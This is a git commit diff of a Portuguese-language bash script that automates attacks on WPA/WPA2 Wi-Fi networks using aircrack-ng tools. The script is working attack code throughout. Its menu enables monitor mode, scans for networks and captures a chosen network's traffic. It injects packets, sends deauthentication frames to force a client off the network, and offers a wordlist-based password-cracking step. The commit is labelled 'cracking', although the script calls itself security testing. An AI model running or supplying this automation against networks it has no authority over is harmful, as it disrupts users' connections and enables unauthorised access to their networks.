a2cf986f3a19d30cb6bb6268db0fdf84c297431b
Joao Lucas <joaolucas@linuxmail.org>
2016-07-20 13:07:31 -0300

    cracking WPA/WPA2

--- wpa.sh
+++ wpa.sh
@@ -1,5 +1,4 @@
 #/bin/bash
-#
 # Script para automatizar testes de segurança em redes WPA/WPA2
 # 
 # Data: 19/07/2016 versão 0.1-0
@@ -11,30 +10,31 @@ INTERFACE=wlp2s0
 INTERFACE_MON=wlp2s0mon
 DATA=$(date +'%d-%m-%Y-%H-%M')
 ARQ_CAP=arq_$DATA.cap
-WORD_LIST=/home/joao/wpa.txt
+WORD_LIST=/home/joao_lucas/Área\ de\ Trabalho/Wordlists/wpa.list
 
 menu(){
 	echo "##=================salvando em: $ARQ_CAP==================##"
 	echo "1. Ativar modo monitoramento" 
-	echo "2. Iniciar captura de pacotes"
+	echo "2. Scannear redes encontradas"
 	echo "3. Injetar pacotes"
-	echo "4. Quebrar senha"
+	echo "4. Fazer deauth"
+        echo "5. Quebrar senha"
 	echo "99. Sair"
 	read -p "> Opção: " opt
 
 	case $opt in
-		1) monitoramento ;;
-		2) capturar_pacotes ;;
-		3) deauth ;; 
-		3) injetar_pacotes ;;
-		4) TENTAR_quebrar_senha ;;
+		1) modo_monitoramento ;;
+		2) scannear_redes ;;
+		3) injetar_pacotes ;; 
+                4) deauth ;;
+                5) TENTAR_quebrar_senha ;;
 		99) echo "Saindo..."; airmon-ng stop $INTERFACE_MON; sleep 2; exit 0 ;; 
 		*) echo "Opção invalida!"; menu ;;
 esac	
 }
 
 # ATIVAR MODO MONITORAMENTO
-monitoramento(){
+modo_monitoramento(){
 	airmon-ng start $INTERFACE
 	if [ $? -eq 0 ]
 	then
@@ -47,20 +47,22 @@ monitoramento(){
 	fi
 }
 
-# INICIAR CAPTURA DE PACOTES
-capturar_pacotes(){
+# SCANNEAR AS REDES ENCONTRADAS
+scannear_redes(){
 	airodump-ng $INTERFACE_MON
-	echo -e "\n ~ Escolha a rede desejada!"
-	echo -e "[ AVISO ] Anote os dados da rede escolhida, como ESSID, BSSID, CHANNEL e CLIENT"
-        read -p "ESSID: " ESSID
-	read -p "BSSID: " BSSID
-	read -p "CHANNEL: " CHANNEL 
-	echo "Iniciando captura de pacotes na rede $ESSID"
-	airodump-ng --bssid $BSSID --channel $CHANNEL --write $ARQ_CAP $INTERFACE_MON
+	#aireplay-ng --test $INTERFACE_MON
+        echo -e "\n ~ Escolha a rede desejada!"
+	echo -e "[ AVISO ] Anote os dados da rede escolhida, como ESSID, BSSID e CANAL"
+        read -p "> ESSID: " ESSID
+	read -p "> BSSID: " BSSID
+	read -p "> CANAL: " CHANNEL 
+	echo "~ Iniciando captura de pacotes na rede $ESSID"
+	airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $ARQ_CAP $INTERFACE_MON
 	if [ $? -eq 0 ]
 	then
-		echo -e "\n [ OK ] Captura de pacotes da rede $ESSID executado com sucesso!"
-		echo "~ Salvando em: $ARQ_CAP"
+                echo -e "\n [ OK ] Captura de pacotes da rede $ESSID executado com sucesso!"
+	        echo "[ AVISO ] Anote o mac de pelo menos um cliente"	 
+                echo "~ Salvando em: $ARQ_CAP"
 		menu	
 	else
 		echo "[ FALHA ] Ocorreram erros em capturar pacotes da rede $ESSID"
@@ -70,9 +72,9 @@ capturar_pacotes(){
 
 # FUNÇAO PARA FAZER DEAUTH
 deauth(){
-	#echo "Fazendo DEAUTH"
-        read -p ""	
-        aireplay-ng -5 -a $AP -c $CLIENT $INTERFACE_MON --ignore-negative-one 
+        read -p "> Informe o mac de um cliente: " client
+        aireplay-ng --deauth 1 -a $BSSID -e $ESSID -c $client $INTERFACE_MON --ignore-negative-one 
+	#echo "~ Fazendo DEAUTH"	
 	if [ $? -eq 0 ]
 	then
 		echo "[ OK ] DEAUTH realizado com sucesso!"
@@ -85,8 +87,8 @@ deauth(){
 
 # FUNÇÃO PARA INJETAR PACOTES
 injetar_pacotes(){
-	
-        aireplay-ng -0 50 -a $BSSID -c $CLIENT $INTERFACE_MON
+        read -p "> Informe o mac de um cliente: " client
+        aireplay-ng -0 50 -a $BSSID -c $client $INTERFACE_MON
 	if [ $? -eq 0 ]
 	then
 		echo "[ OK ] Pacotes injetados!"
